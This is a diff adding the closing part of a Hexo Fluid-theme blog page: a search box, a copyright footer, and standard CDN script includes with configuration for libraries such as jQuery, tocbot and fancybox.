+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
